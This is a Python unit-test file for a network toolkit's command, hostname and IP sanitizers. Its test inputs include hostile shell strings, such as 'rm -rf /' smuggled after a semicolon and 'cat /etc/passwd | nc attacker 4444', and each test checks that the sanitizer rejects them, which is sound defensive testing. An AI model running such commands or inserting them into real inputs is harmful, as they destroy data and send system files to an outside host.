"""安全模块单元测试"""

import pytest

from netops_toolkit.domain.exceptions import CommandInjectionError
from netops_toolkit.infrastructure.security.sanitizer import (
    escape_for_shell,
    sanitize_command,
    sanitize_hostname,
    sanitize_ip,
)


class TestSanitizeCommand:
    def test_clean_command(self):
        assert sanitize_command("show version") == "show version"

    def test_shell_metachar_strict(self):
        with pytest.raises(CommandInjectionError):
            sanitize_command("show ver; rm -rf /")

    def test_pipe_strict(self):
        with pytest.raises(CommandInjectionError):
            sanitize_command("cat /etc/passwd | nc attacker 4444")

    def test_backtick_strict(self):
        with pytest.raises(CommandInjectionError):
            sanitize_command("echo `whoami`")

    def test_dollar_strict(self):
        with pytest.raises(CommandInjectionError):
            sanitize_command("echo $HOME")

    def test_non_strict_removes(self):
        result = sanitize_command("show ver; echo", strict=False)
        assert ";" not in result

    def test_empty_command(self):
        assert sanitize_command("") == ""


class TestSanitizeHostname:
    def test_valid_hostname(self):
        assert sanitize_hostname("router-01.example.com") == "router-01.example.com"

    def test_invalid_chars(self):
        with pytest.raises(CommandInjectionError):
            sanitize_hostname("router;rm")

    def test_empty(self):
        assert sanitize_hostname("") == ""


class TestSanitizeIP:
    def test_valid_ipv4(self):
        assert sanitize_ip("192.168.1.1") == "192.168.1.1"

    def test_valid_cidr(self):
        assert sanitize_ip("10.0.0.0/24") == "10.0.0.0/24"

    def test_invalid_chars(self):
        with pytest.raises(CommandInjectionError):
            sanitize_ip("192.168.1.1; rm -rf /")


class TestEscapeForShell:
    def test_simple(self):
        assert escape_for_shell("hello") == "'hello'"

    def test_with_single_quote(self):
        result = escape_for_shell("it's")
        assert "it" in result
        assert "s" in result
